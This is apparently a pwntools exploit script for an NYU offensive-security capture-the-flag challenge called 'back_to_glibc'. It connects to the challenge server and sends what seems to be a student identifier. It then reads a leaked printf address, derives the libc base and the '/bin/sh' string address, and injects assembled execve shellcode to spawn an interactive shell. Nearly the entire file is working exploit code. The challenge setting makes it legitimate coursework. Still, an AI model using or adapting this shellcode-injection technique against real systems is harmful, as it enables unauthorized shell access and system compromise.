from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./back_to_glibc"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    b main+0x0041
    continue
    ''')
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1292)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

libc = ELF(libc, checksec=False)
bin_sh_offset = next(libc.search(b"/bin/sh"))

p.recvuntil(b'this one: ')
printf_address = u64(p.recvline().strip())
print(f'printf address: {hex(printf_address)}')
printf_offset = libc.symbols["printf"]
print(f'printf offset: {hex(printf_offset)}')
base_address = printf_address - printf_offset
string_address = base_address + bin_sh_offset

print(f'String address: {hex(string_address)}')
p.recvuntil(b"?\n")
shell_code = f'''
mov rdx, 0x0
mov rdi, {hex(string_address)}
lea rsi, [0x0]
mov rax, rdi
mov rax, 0x3b
syscall
'''

shellcode = asm(shell_code)
print(f'Shell code: {shell_code}')
p.sendline(shellcode)
p.interactive()
